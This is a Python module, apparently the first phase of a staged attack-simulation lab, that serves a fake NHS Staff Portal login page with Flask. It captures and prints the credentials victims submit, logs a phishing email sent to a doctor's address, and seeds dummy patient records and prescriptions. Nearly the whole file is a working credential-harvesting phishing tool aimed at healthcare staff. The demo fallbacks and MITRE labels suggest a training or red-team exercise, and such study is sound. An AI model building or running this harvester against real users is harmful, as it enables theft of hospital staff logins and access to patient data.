#!/usr/bin/env python3
"""Phase 0 — Phishing credential harvester + local data creation.

Starts a fake NHS Staff Portal login page (Flask) on port 8080.
Waits for the victim to submit credentials, then shuts down and
passes the harvested creds to the orchestrator.

Maps to MITRE T1566.001 (Spearphishing Link), T1078 (Valid Accounts).
"""

import csv
import os
import socket
import threading
from pathlib import Path

from utils.logger import AttackLogger

PORT = 8080
TIMEOUT = 300  # seconds to wait for victim to submit before giving up

# Fallback if victim never submits (keeps demo moving)
FALLBACK_USER = "ehradmin"
FALLBACK_PASS = "Hospital2024!"

TEXT_FILES = {
    "patient_notes/patient_001.txt": (
        "Patient ID: P001\nName: Harry M\nDOB: 2001-12-13\n"
        "Ward: General\nNotes: Fever improving, waiting for blood test results.\n"
    ),
    "patient_notes/patient_002.txt": (
        "Patient ID: P002\nName: Faaris K\nDOB: 2003-06-27\n"
        "Ward: Psychiatric\nNotes: Mood swings have stabilised.\n"
    ),
    "patient_notes/patient_003.txt": (
        "Patient ID: P003\nName: Heidi M\nDOB: 2003-05-10\n"
        "Ward: Cardiology\nNotes: Chest pain under observation.\n"
    ),
    "prescriptions/prescription_001.txt": (
        "Prescription ID: RX001\nPatient ID: P001\nMedication: Paracetamol\n"
        "Dose: 500mg\nFrequency: 4 times daily\n"
    ),
    "prescriptions/prescriptions_002.txt": (
        "Prescription ID: RX002\nPatient ID: P002\nMedication: Olanzapine\n"
        "Dose: 5mg\nFrequency: 1 daily\n"
    ),
}

CSV_FILES = {
    "appointments/appointments_today.csv": [
        ["appointment_id", "patient_id", "department", "time"],
        ["A001", "P001", "General", "09:30"],
        ["A002", "P002", "Psychiatric", "11:00"],
        ["A003", "P003", "Cardiovascular", "14:30"],
        ["A004", "P004", "Radiology", "16:00"],
    ],
}


def get_local_ip() -> str:
    """Return the machine's non-loopback IP, preferring 172.16.x.x subnets."""
    import subprocess
    # Try routing toward the VMware host-only gateway first
    for gateway in ("172.16.63.1", "172.16.102.1", "192.168.1.1"):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            s.connect((gateway, 80))
            ip = s.getsockname()[0]
            s.close()
            if not ip.startswith("127."):
                return ip
        except Exception:
            pass

    # Fallback: parse hostname -I output
    try:
        out = subprocess.check_output(["hostname", "-I"], text=True).strip()
        for ip in out.split():
            if not ip.startswith("127."):
                return ip
    except Exception:
        pass

    return "127.0.0.1"


def build_flask_app(creds: dict, event: threading.Event):
    """Create and return the Flask app."""
    try:
        from flask import Flask, render_template, request, redirect, url_for
    except ImportError:
        return None

    template_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates")
    app = Flask(__name__, template_folder=template_dir)
    app.secret_key = os.urandom(16)

    # Silence Flask request logs
    import logging
    log = logging.getLogger("werkzeug")
    log.setLevel(logging.ERROR)

    @app.route("/", methods=["GET"])
    def index():
        return render_template("login.html", error=None)

    @app.route("/login", methods=["POST"])
    def login():
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "").strip()

        if not username or not password:
            return render_template("login.html", error="Please enter both username and password.")

        # Store harvested credentials and signal the main thread
        creds["username"] = username
        creds["password"] = password
        event.set()

        return render_template("success.html")

    return app


class Phase0Phishing:
    """Serve a fake NHS login page, harvest credentials, seed local data."""

    PHASE_NAME = "phase0_phishing"

    def __init__(self, logger: AttackLogger, data_dir: str = "hospital_records"):
        self.logger = logger
        self.data_dir = Path(data_dir)

    def run(self) -> dict:
        print("\n--- Phase 0: Phishing / Social Engineering (T1566.001) ---\n")

        kali_ip = get_local_ip()
        phishing_url = f"http://{kali_ip}:{PORT}"

        self.logger.log(self.PHASE_NAME, "phishing_server_starting",
                        {"url": phishing_url, "port": PORT})

        # Shared state between Flask thread and main thread
        creds: dict = {}
        creds_event = threading.Event()

        app = build_flask_app(creds, creds_event)

        if app is None:
            print("[!] Flask not installed — falling back to hardcoded credentials.")
            print(f"    Install with: pip install flask --break-system-packages\n")
            return self._fallback(kali_ip)

        # Start Flask in a background thread using Werkzeug's server
        try:
            from werkzeug.serving import make_server
        except ImportError:
            print("[!] Werkzeug not available — falling back to hardcoded credentials.\n")
            return self._fallback(kali_ip)

        server = make_server("0.0.0.0", PORT, app)
        server_thread = threading.Thread(target=server.serve_forever, daemon=True)
        server_thread.start()

        print("[*] Phishing server running.")
        print(f"\n    Open this URL in the victim's browser:\n")
        print(f"    ➜  {phishing_url}\n")
        print(f"[*] Waiting for victim to submit credentials "
              f"(timeout: {TIMEOUT}s)...\n")

        self.logger.log(self.PHASE_NAME, "phishing_email_sent",
                        {"subject": "Urgent - Unusual account activity",
                         "recipient": "Doctor1@nhs.uk",
                         "phishing_url": phishing_url})

        submitted = creds_event.wait(timeout=TIMEOUT)
        server.shutdown()

        if not submitted:
            print("[!] Timeout — no credentials received. Using fallback credentials.")
            self.logger.log(self.PHASE_NAME, "timeout_fallback",
                            {"fallback_user": FALLBACK_USER}, success=False)
            creds["username"] = FALLBACK_USER
            creds["password"] = FALLBACK_PASS
        else:
            print(f"[*] Credentials harvested!")
            print(f"    Username : {creds['username']}")
            print(f"    Password : {creds['password']}\n")
            self.logger.log(self.PHASE_NAME, "credentials_harvested",
                            {"username": creds["username"],
                             "method": "fake_nhs_login_page",
                             "phishing_url": phishing_url})

        # Seed local demo data
        created = self._seed_data()
        print(f"[*] Healthcare data created in: {self.data_dir}")
        print(f"[*] {len(created)} files seeded.\n")

        self.logger.log(self.PHASE_NAME, "data_created",
                        {"directory": str(self.data_dir),
                         "file_count": len(created)})

        return {
            "success": True,
            "harvested_user": creds["username"],
            "harvested_password": creds["password"],
            "data_dir": str(self.data_dir),
            "files_created": len(created),
        }

    def _fallback(self, kali_ip: str) -> dict:
        """Return hardcoded credentials when Flask is unavailable."""
        print(f"[*] Simulating phishing email to Doctor1@nhs.uk")
        print(f"[*] Harvested credentials: {FALLBACK_USER}:{FALLBACK_PASS}\n")
        self.logger.log(self.PHASE_NAME, "credentials_harvested",
                        {"username": FALLBACK_USER, "method": "simulated_fallback"})
        created = self._seed_data()
        return {
            "success": True,
            "harvested_user": FALLBACK_USER,
            "harvested_password": FALLBACK_PASS,
            "data_dir": str(self.data_dir),
            "files_created": len(created),
        }

    def _seed_data(self) -> list:
        """Create local dummy hospital records."""
        self.data_dir.mkdir(parents=True, exist_ok=True)
        created: list[str] = []

        for rel, content in TEXT_FILES.items():
            path = self.data_dir / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(content, encoding="utf-8")
            created.append(str(path))

        for rel, rows in CSV_FILES.items():
            path = self.data_dir / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            with path.open("w", newline="", encoding="utf-8") as f:
                csv.writer(f).writerows(rows)
            created.append(str(path))

        return created
